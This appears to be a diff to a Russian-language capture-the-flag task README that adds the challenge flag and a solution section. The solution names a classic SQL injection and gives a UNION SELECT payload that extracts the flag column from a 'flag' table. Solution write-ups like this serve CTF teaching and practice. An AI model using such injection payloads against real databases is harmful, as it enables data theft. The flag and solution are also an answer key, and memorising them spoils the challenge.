@@ -5,3 +5,7 @@
 
 ## Флаг
 TeacherCTF{n0_eDucation_syst3m_1s_flawle55}
+
+## Решение
+Классическая sql инъекция. Получить флаг можно сделав запрос
+eweweewwe' UNION SELECT flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag,flag FROM flag -- 
